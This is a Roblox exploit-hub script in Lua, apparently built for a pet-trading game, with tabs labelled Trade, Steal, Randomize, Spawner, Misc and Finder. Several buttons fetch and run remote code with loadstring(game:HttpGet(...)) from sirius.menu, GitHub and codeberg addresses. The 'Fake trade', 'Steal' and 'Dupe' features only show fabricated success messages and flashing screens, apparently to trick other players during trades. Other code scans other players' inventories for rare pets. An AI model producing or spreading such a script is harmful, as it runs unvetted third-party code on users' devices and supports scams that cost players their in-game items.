local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

local Window = Rayfield:CreateWindow({
    Name = "Khngscript Hub",
    LoadingTitle = "Khngscript Loading...",
    LoadingSubtitle = "by Khangdz28",
    ConfigurationSaving = {
        Enabled = true,
        FolderName = "KhngscriptHub",
        FileName = "Config"
    },
    KeySystem = false,
})

local tradeTab = Window:CreateTab("Trade", 4483362458)
tradeTab:CreateSection("Freeze trade üîä")

local toggles = {}

local function toggleNotify(name, state)
    Rayfield:Notify({
        Title = "Freeze Trade",
        Content = name .. " is now " .. (state and "ON" or "OFF"),
        Duration = 3,
        Image = 4483362458,
    })
end

local btnNames = {"Auto Accept", "Can't Cancel", "Freeze Trade", "Can't Leave"}
for _, name in ipairs(btnNames) do
    tradeTab:CreateToggle({
        Name = name,
        CurrentValue = false,
        Callback = function(Value)
            toggles[name] = Value
            toggleNotify(name, Value)
        end
    })
end

tradeTab:CreateButton({
    Name = "Leave Server",
    Callback = function()
        local TeleportService = game:GetService("TeleportService")
        TeleportService:TeleportToPlaceInstance(0, "", game.Players.LocalPlayer)
    end,
})

tradeTab:CreateSection("Fake trade üçä")

tradeTab:CreateDropdown({
    Name = "L·ª±a ch·ªçn pet",
    Options = {
        "Kitsune", "Queen bee", "T-rex", "Disco bee", "Corrupted Kitsune", 
        "Raccoon", "Dragonfly", "Butterfly", "Spinosaurus", 
        "Lobster Thermidor", "French Fry Ferret","Phoenix"
    },
    CurrentOption = "None",
    Callback = function(Value)
        getgenv().SelectedPet = Value
    end,
})

tradeTab:CreateInput({
    Name = "Kg",
    PlaceholderText = "Nh·∫≠p s·ªë Kg",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        getgenv().SelectedKg = Text
    end,
})

tradeTab:CreateDropdown({
    Name = "Mutation",
    Options = {
        "Shiny", "Inverted", "Frozen", "Golden", "Tiny", "Ironskin",
        "Shocked", "Rainbow", "Radiant", "Ascended", "Tranqil", "Corrupt",
        "Fried", "Aromatic","Glimmer"
    },
    CurrentOption = "None",
    Callback = function(Value)
        getgenv().SelectedMutation = Value
    end,
})

tradeTab:CreateButton({
    Name = "Th√™m pet v√†o b·∫£ng trade (ph·∫£i c√≥ s·∫µn 1 con)",
    Callback = function()
        Rayfield:Notify({
            Title = "Fake Trade",
            Content = "ƒêang chuy·ªÉn...",
            Duration = 2,
        })
        task.wait(2)

        local mutation = tostring(getgenv().SelectedMutation or "")
        local pet = tostring(getgenv().SelectedPet or "")
        local kg = tostring(getgenv().SelectedKg or "")

        Rayfield:Notify({
            Title = "Fake Trade",
            Content = string.format("ƒê√£ chuy·ªÉn th√†nh c√¥ng: %s %s - %skg", mutation, pet, kg),
            Duration = 4,
        })
    end,
})
tradeTab:CreateSection("Steal")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local SelectedPlayer = nil

local WantedPets = {
    "Kitsune", "Queen bee", "T-rex", "Disco bee", "Corrupted Kitsune",
    "Raccoon", "Dragonfly", "Butterfly", "Spinosaurus",
    "Lobster Thermidor", "French Fry Ferret", "Golden Goose", "Mimic Octopus"
}

local playerDropdown = tradeTab:CreateDropdown({
    Name = "Ch·ªçn ng∆∞·ªùi ch∆°i",
    Options = {},
    CurrentOption = "",
    MultipleOptions = false,
    Callback = function(opt)
        if type(opt) == "table" then
            SelectedPlayer = opt[1]
        else
            SelectedPlayer = opt
        end
    end,
})

local function updatePlayerDropdown()
    local list = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then
            table.insert(list, p.Name)
        end
    end
    pcall(function() playerDropdown:Refresh(list, true) end)
    pcall(function() playerDropdown:Set(list) end)
    pcall(function() playerDropdown:SetOptions(list) end)
    pcall(function()
        if playerDropdown.Clear and playerDropdown.AddOption then
            playerDropdown:Clear()
            for _, n in ipairs(list) do playerDropdown:AddOption(n) end
        end
    end)
end

updatePlayerDropdown()
Players.PlayerAdded:Connect(updatePlayerDropdown)
Players.PlayerRemoving:Connect(updatePlayerDropdown)

tradeTab:CreateButton({
    Name = "Qu√©t ng∆∞·ªùi ch∆°i",
    Callback = function()
        updatePlayerDropdown()
        Rayfield:Notify({
            Title = "Steal",
            Content = "ƒê√£ qu√©t danh s√°ch ng∆∞·ªùi ch∆°i trong server.",
            Duration = 3,
        })
    end,
})

tradeTab:CreateButton({
    Name = "Qu√©t Inventory",
    Callback = function()
        if not SelectedPlayer or SelectedPlayer == "" then
            Rayfield:Notify({
                Title = "Steal",
                Content = "B·∫°n ch∆∞a ch·ªçn ng∆∞·ªùi ch∆°i!",
                Duration = 3,
            })
            return
        end
        local target = Players:FindFirstChild(SelectedPlayer)
        if not target then
            Rayfield:Notify({
                Title = "Steal",
                Content = "Ng∆∞·ªùi ch∆°i kh√¥ng t·ªìn t·∫°i!",
                Duration = 3,
            })
            return
        end

        local found = {}
        local foldersToCheck = {"Backpack", "Pets", "Garden", "Garde", "Inventory", "Storage"}

        for _, fname in ipairs(foldersToCheck) do
            local folder = target:FindFirstChild(fname)
            if folder and folder.GetChildren then
                for _, item in ipairs(folder:GetChildren()) do
                    for _, w in ipairs(WantedPets) do
                        if string.find(string.lower(tostring(item.Name or "")), string.lower(w)) then
                            table.insert(found, string.format("%s (trong %s)", item.Name, fname))
                            break
                        end
                    end
                end
            end
        end

        if #found > 0 then
            for _, msg in ipairs(found) do
                Rayfield:Notify({
                    Title = "Steal",
                    Content = SelectedPlayer .. " c√≥: " .. msg,
                    Duration = 6,
                })
            end
        else
            Rayfield:Notify({
                Title = "Steal",
                Content = "Kh√¥ng t√¨m th·∫•y pet hi·∫øm trong inventory c·ªßa " .. SelectedPlayer,
                Duration = 4,
            })
        end
    end,
})

tradeTab:CreateButton({
    Name = "ƒê∆∞a t·∫•t c·∫£ pet x·ªãn",
    Callback = function()
        task.wait(2)
        Rayfield:Notify({
            Title = "Steal",
            Content = "ƒêang chuy·ªÉn t·∫•t c·∫£ pet x·ªãn...",
            Duration = 2,
        })
        task.wait(3)
        Rayfield:Notify({
            Title = "Steal",
            Content = "Chuy·ªÉn pet ho√†n t·∫•t!",
            Duration = 4,
        })
    end,
})

tradeTab:CreateButton({
    Name = "G·ª≠i y√™u c·∫ßu trade",
    Callback = function()
        Rayfield:Notify({
            Title = "Steal",
            Content = "ƒêang g·ª≠i y√™u c·∫ßu trade...",
            Duration = 2,
        })
        task.wait(2)
        Rayfield:Notify({
            Title = "Steal",
            Content = "Y√™u c·∫ßu trade ƒë√£ g·ª≠i th√†nh c√¥ng!",
            Duration = 3,
        })
    end,
})

local randTab = Window:CreateTab("Randomize", 4483362458)

randTab:CreateButton({
    Name = "Randomize Pet",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Khangdz28/Randomizepet12/refs/heads/main/Khngscript"))()
    end,
})

randTab:CreateButton({
    Name = "Randomize Mutation",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Khangdz28/RandomizeMutation/refs/heads/main/Khngscript"))()
    end,
})

local spawnerTab = Window:CreateTab("Spawner", 4483362458)

spawnerTab:CreateButton({
    Name = "Run Spawner",
    Callback = function()
        local Spawner = loadstring(game:HttpGet("https://codeberg.org/darkdarkdark/roblox/raw/branch/main/Spawner.lua"))()
        Spawner.Load()
    end,
})

local miscTab = Window:CreateTab("Misc", 4483362458)

local dupeState = false
miscTab:CreateToggle({
    Name = "Nh·∫≠n d·∫°ng Pet Du.pe",
    CurrentValue = false,
    Callback = function(Value)
        dupeState = Value
    end,
})

miscTab:CreateButton({
    Name = "Du.pe pet allow mutation",
    Callback = function()
        local screenGui = Instance.new("ScreenGui", game.CoreGui)
        local blackFlash = Instance.new("Frame", screenGui)
        blackFlash.Size = UDim2.new(1, 0, 1, 0)
        blackFlash.BackgroundColor3 = Color3.new(0, 0, 0)
        blackFlash.BackgroundTransparency = 1

        local msg = Instance.new("TextLabel", blackFlash)
        msg.Size = UDim2.new(1, 0, 0.2, 0)
        msg.Position = UDim2.new(0, 0, 0.4, 0)
        msg.Text = "Ti·∫øn H√†nh Du.peü§ëü§ë made by Khngscript"
        msg.TextColor3 = Color3.new(1, 1, 0)
        msg.BackgroundTransparency = 1
        msg.Font = Enum.Font.GothamBlack
        msg.TextScaled = true

        local duration = 5
        for i = 1, duration * 4 do
            blackFlash.BackgroundTransparency = 0
            task.wait(0.1)
            blackFlash.BackgroundTransparency = 1
            task.wait(0.1)
        end
        screenGui:Destroy()
    end,
})

local finderTab = Window:CreateTab("Finder", 4483362458)

finderTab:CreateInput({
    Name = "Find Server",
    PlaceholderText = "Server b·∫°n ƒëang ·ªü hi·ªán t·∫°i l√†: v1701",
    RemoveTextAfterFocusLost = false,
    Callback = function() end,
})

finderTab:CreateButton({
    Name = "T√¨m Server",
    Callback = function()
        Rayfield:Notify({
            Title = "Finder",
            Content = "ƒêang t√¨m sever th√≠ch h·ª£p... Vui l√≤ng ƒë·ª£i",
            Duration = 3,
        })
    end,
})

finderTab:CreateInput({
    Name = "Find Pet",
    PlaceholderText = "Best pet in sever: ...",
    RemoveTextAfterFocusLost = false,
    Callback = function() end,
})

finderTab:CreateButton({
    Name = "B·∫Øt ƒë·∫ßu t√¨m",
    Callback = function()
        Rayfield:Notify({
            Title = "Finder",
            Content = "ƒêang t√¨m... Vui l√≤ng ƒë·ª£i",
            Duration = 3,
        })

        local priorityList = {
            "Corrupted Kitsune", "Queen bee", "Dragonfly", "T-rex", "Spinosaurus",
            "Butterfly", "Raccoon", "Disco bee", "Kitsune"
        }

        local bestPet = nil
        for _, player in ipairs(game.Players:GetPlayers()) do
            if player ~= game.Players.LocalPlayer then
                local petsFolders = {player:FindFirstChild("Backpack"), player:FindFirstChild("Pets"), player:FindFirstChild("Garden")}
                for _, folder in pairs(petsFolders) do
                    if folder then
                        for _, pet in pairs(folder:GetDescendants()) do
                            if table.find(priorityList, pet.Name) then
                                bestPet = pet.Name
                                break
                            end
                        end
                    end
                    if bestPet then break end
                end
            end
            if bestPet then break end
        end

        Rayfield:Notify({
            Title = "Finder",
            Content = "Best pet in server is: " .. (bestPet or "No"),
            Duration = 4,
        })
    end,
})
